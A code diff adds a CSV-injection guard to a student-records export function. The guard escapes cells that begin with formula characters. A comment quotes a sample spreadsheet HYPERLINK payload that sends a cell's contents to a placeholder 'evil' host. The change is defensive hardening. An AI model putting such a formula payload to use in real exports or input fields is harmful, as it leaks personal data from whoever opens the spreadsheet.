@@ -624,9 +624,18 @@ function downloadStudentsCsv(rows) {
     "created_at",
     "updated_at",
   ];
+  // CSV-injection guard. Excel / LibreOffice / Numbers all evaluate any
+  // cell starting with =, +, -, @, tab, or carriage return as a formula
+  // — which means a student-controlled display_name like
+  //   =HYPERLINK("https://evil/?c="&A1, "click")
+  // exfiltrates the row when a counsellor opens the export. Prefix
+  // those with a single quote (the Excel convention to force literal-
+  // text). Then standard RFC 4180 quoting on top.
+  const FORMULA_LEAD = /^[=+\-@\t\r]/;
   const esc = (v) => {
     if (v == null) return "";
-    const s = String(v);
+    let s = String(v);
+    if (FORMULA_LEAD.test(s)) s = "'" + s;
     return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
   };
   const lines = [cols.join(",")];
